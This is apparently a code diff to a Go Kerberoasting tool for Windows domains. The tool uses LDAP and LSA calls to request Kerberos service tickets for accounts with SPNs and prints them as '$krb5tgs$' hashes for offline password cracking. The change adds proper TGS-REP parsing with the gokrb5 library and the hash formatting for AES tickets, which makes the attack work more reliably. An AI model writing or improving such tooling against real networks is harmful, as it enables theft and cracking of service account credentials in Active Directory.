@@ -6,35 +6,36 @@ import (
 	"encoding/hex"
 	"flag"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"log"
 	"math"
 	"os"
-	"regexp"
-	"strconv"
+	"strings"
 	"unsafe"
 
+	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
+	"github.com/jcmturner/gokrb5/v8/messages"
 	"golang.org/x/sys/windows"
 )
 
-//sys ldap_initW(hostName string, portNumber uint64) (ld uintptr,err error) = Wldap32.ldap_initA
-//sys ldap_bind_sW(ld uintptr, dn *uint8, cred *uint8, method uint64) (ret uint64) = Wldap32.ldap_bind_sA
-//sys ldap_search_sA(ld uintptr, base *uint8, scope uint64, filter *uint8,  attrs **uint8, attrsonly uint64, res *uintptr) (ret uint64) = Wldap32.ldap_search_sA
-//sys ldap_count_entries(ld uintptr, res uintptr) (ret uint64) = Wldap32.ldap_count_entries
-//sys ldap_get_valuesA(ld uintptr, entry uintptr, attr *uint8) (ret **uint8) = Wldap32.ldap_get_valuesA
-//sys ldap_first_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_first_entry
-//sys ldap_next_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_next_entry
-//sys ldap_value_free(vals **uint8) (ret uint64) = Wldap32.ldap_value_free
-//sys ldap_unbind_s(ld uintptr) (ret uint64) = Wldap32.ldap_unbind_s
-//sys ldap_first_attribute(ld uintptr, entry uintptr, ber *uintptr) (ret *uint8) = Wldap32.ldap_first_attribute
-//sys ldap_next_attribute(ld uintptr, entry uintptr, ber uintptr) (ret *uint8) = Wldap32.ldap_next_attribute
-//sys ldap_count_valuesA(vals **uint8) (ret uint64) = Wldap32.ldap_count_values
-//sys ldap_memfree(block *uint8) = Wldap32.ldap_memfree
-//sys LsaConnectUntrusted(lsaHandle *uintptr) (ret uint32) = Secur32.LsaConnectUntrusted
-//sys LsaDeregisterLogonProcess(lsaHandle uintptr) (ret uint32) = Secur32.LsaDeregisterLogonProcess
-//sys LsaLookupAuthenticationPackage(lsaHandle uintptr, packageName *LSA_STRING, authenticationPackage *uint32) (ret uint32) = Secur32.LsaLookupAuthenticationPackage
-//sys LsaCallAuthenticationPackage(lsaHandle uintptr, authenticationPackage uint32, protocolSubmitBuffer uintptr, submitBufferLength uint32, protocolReturnBuffer *uintptr, returnBufferLength *uint32, pNTSTATUS *uint32) (ret uint32) = Secur32.LsaCallAuthenticationPackage
-//sys GetComputerNameExA(nametype uint32, buf unsafe.Pointer, n *uint32) (err error) = Kernel32.GetComputerNameExA
+// sys ldap_initW(hostName string, portNumber uint64) (ld uintptr,err error) = Wldap32.ldap_initA
+// sys ldap_bind_sW(ld uintptr, dn *uint8, cred *uint8, method uint64) (ret uint64) = Wldap32.ldap_bind_sA
+// sys ldap_search_sA(ld uintptr, base *uint8, scope uint64, filter *uint8,  attrs **uint8, attrsonly uint64, res *uintptr) (ret uint64) = Wldap32.ldap_search_sA
+// sys ldap_count_entries(ld uintptr, res uintptr) (ret uint64) = Wldap32.ldap_count_entries
+// sys ldap_get_valuesA(ld uintptr, entry uintptr, attr *uint8) (ret **uint8) = Wldap32.ldap_get_valuesA
+// sys ldap_first_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_first_entry
+// sys ldap_next_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_next_entry
+// sys ldap_value_free(vals **uint8) (ret uint64) = Wldap32.ldap_value_free
+// sys ldap_unbind_s(ld uintptr) (ret uint64) = Wldap32.ldap_unbind_s
+// sys ldap_first_attribute(ld uintptr, entry uintptr, ber *uintptr) (ret *uint8) = Wldap32.ldap_first_attribute
+// sys ldap_next_attribute(ld uintptr, entry uintptr, ber uintptr) (ret *uint8) = Wldap32.ldap_next_attribute
+// sys ldap_count_valuesA(vals **uint8) (ret uint64) = Wldap32.ldap_count_values
+// sys ldap_memfree(block *uint8) = Wldap32.ldap_memfree
+// sys LsaConnectUntrusted(lsaHandle *uintptr) (ret uint32) = Secur32.LsaConnectUntrusted
+// sys LsaDeregisterLogonProcess(lsaHandle uintptr) (ret uint32) = Secur32.LsaDeregisterLogonProcess
+// sys LsaLookupAuthenticationPackage(lsaHandle uintptr, packageName *LSA_STRING, authenticationPackage *uint32) (ret uint32) = Secur32.LsaLookupAuthenticationPackage
+// sys LsaCallAuthenticationPackage(lsaHandle uintptr, authenticationPackage uint32, protocolSubmitBuffer uintptr, submitBufferLength uint32, protocolReturnBuffer *uintptr, returnBufferLength *uint32, pNTSTATUS *uint32) (ret uint32) = Secur32.LsaCallAuthenticationPackage
+// sys GetComputerNameExA(nametype uint32, buf unsafe.Pointer, n *uint32) (err error) = Kernel32.GetComputerNameExA
 var verbose bool
 
 const (
@@ -198,15 +199,28 @@ func getDomainSPNTicket(user User) {
 		tmp := *(*byte)(unsafe.Add(unsafe.Pointer(protocolReturnBufferRaw.ticket.encodedTicket), offset))
 		encodedTicket = append(encodedTicket, tmp)
 	}
-	ticketHexStream := hex.EncodeToString(encodedTicket)
-	reg := regexp.MustCompile("a382....3082....a0030201(..)a1.{1,4}.......a282(....)........(.+)")
-	group := reg.FindAllStringSubmatch(ticketHexStream, -1)
-	eType, _ := strconv.ParseInt(group[0][1], 16, 64)             //binary.BigEndian.Uint64(eTypeByte)
-	cipherTextLenBase, _ := strconv.ParseInt(group[0][2], 16, 64) //binary.BigEndian.Uint64(eTypeByte)
-	cipherTextLen := int(cipherTextLenBase - 4)
-	dataToEnd := group[0][3]
-	cipherText := dataToEnd[:cipherTextLen*2]
-	fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", eType, user.sAMAccountName, user.domainName, spn, cipherText[:32], cipherText[32:])
+	// ticketHexStream := hex.EncodeToString(encodedTicket)
+	// reg := regexp.MustCompile("a382....3082....a0030201(..)a1.{1,4}.......a282(....)........(.+)")
+	// group := reg.FindAllStringSubmatch(ticketHexStream, -1)
+	// eType, _ := strconv.ParseInt(group[0][1], 16, 64)             //binary.BigEndian.Uint64(eTypeByte)
+	// cipherTextLenBase, _ := strconv.ParseInt(group[0][2], 16, 64) //binary.BigEndian.Uint64(eTypeByte)
+	// cipherTextLen := int(cipherTextLenBase - 4)
+	// dataToEnd := group[0][3]
+	// cipherText := dataToEnd[:cipherTextLen*2]
+
+	var tgsRep messages.TGSRep
+	if err := tgsRep.Unmarshal(encodedTicket); err != nil {
+		panic(fmt.Sprintf("Failed to decode TGS-REP: %v", err))
+	}
+	eType := tgsRep.Ticket.EncPart.EType
+	cipherText := hex.EncodeToString(tgsRep.Ticket.EncPart.Cipher)
+	spnText := strings.ReplaceAll(spn, ":", "~")
+	if eType == etypeID.AES128_CTS_HMAC_SHA1_96 || eType == etypeID.AES256_CTS_HMAC_SHA1_96 {
+		fmt.Printf("$krb5tgs$%d$%s$%s$*%s*$%s$%s\n", eType, user.sAMAccountName, user.domainName, spnText, cipherText[len(cipherText)-24:], cipherText[:len(cipherText)-24])
+	} else {
+		fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", eType, user.sAMAccountName, user.domainName, spnText, cipherText[:32], cipherText[32:])
+	}
+
 }
 
 func kerberoast() []User {
@@ -250,7 +264,7 @@ func init() {
 	if verbose {
 		log.SetOutput(os.Stderr)
 	} else {
-		log.SetOutput(ioutil.Discard)
+		log.SetOutput(io.Discard)
 	}
 }
 
